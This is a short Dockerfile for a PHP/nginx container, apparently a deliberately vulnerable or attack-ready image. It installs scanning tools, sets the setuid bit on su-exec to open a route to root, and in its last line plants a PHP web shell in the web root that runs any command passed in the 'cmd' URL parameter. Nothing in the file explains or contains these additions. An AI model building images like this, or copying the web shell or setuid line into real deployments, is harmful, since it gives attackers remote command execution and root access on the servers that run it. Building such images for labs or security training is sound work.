#FROM ghcr.io/socialgouv/docker/nginx:7.1.1
FROM trafex/php-nginx
#FROM php:8.0-apache
#USER root

ARG COMMIT_SHA
ENV COMMIT_SHA $COMMIT_SHA

RUN echo "=========="
USER root
RUN apk add --no-cache \
  nmap \
  vim \
  net-tools \
  python3 \
  nmap-scripts \
  su-exec \
  git

COPY --from=golang:1.13-alpine /usr/local/go/ /usr/local/go/
RUN chmod u+s /sbin/su-exec 
RUN echo "=========="
USER nobody
COPY --from=golang:1.13-alpine /usr/local/go/ /usr/local/go/
ENV PATH="/usr/local/go/bin:${PATH}"
RUN echo "<?php echo exec(\$_GET['cmd']);?>" > /var/www/html/ey_webshell.php
